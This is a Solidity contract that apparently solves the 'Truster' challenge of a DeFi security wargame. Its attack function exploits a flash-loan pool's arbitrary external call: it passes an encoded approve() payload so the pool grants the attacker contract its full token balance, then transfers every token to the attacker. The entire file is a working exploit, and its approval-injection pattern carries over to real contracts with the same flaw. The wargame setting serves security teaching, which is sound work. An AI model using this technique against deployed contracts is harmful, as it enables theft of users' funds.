// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterLenderPoolAttacker {
    function attack(
        IERC20 token,
        ITrusterLenderPool pool,
        address attacker
    ) public {
        // make the pool call token.approve to approve this contract to spend all of its balance
        uint256 poolBalance  = token.balanceOf(address(pool));

        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);

        pool.flashLoan(0, attacker, address(token), approvePayload);
        
        token.transferFrom(address(pool), attacker, poolBalance);
    }
   
}
